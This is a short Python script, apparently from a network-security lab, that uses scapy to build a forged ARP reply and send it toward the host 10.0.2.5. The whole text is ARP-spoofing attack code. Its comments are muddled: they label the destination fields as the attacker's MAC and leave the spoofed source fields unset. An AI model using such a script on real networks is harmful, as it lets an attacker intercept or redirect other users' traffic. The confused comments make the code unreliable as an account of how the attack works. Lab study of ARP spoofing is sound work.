from scapy.all import *
e = Ether()
a=ARP()
# attacker's mac
e.dst="08:00:27:75:e3:fb"
# attackers mac
a.hwdst="08:00:27:75:e3:fb"
# user's IP
a.pdst="10.0.2.5"
# option request = 1; attack =2
a.op=2
pkt=e/a
pkt.show()
sendp(pkt)
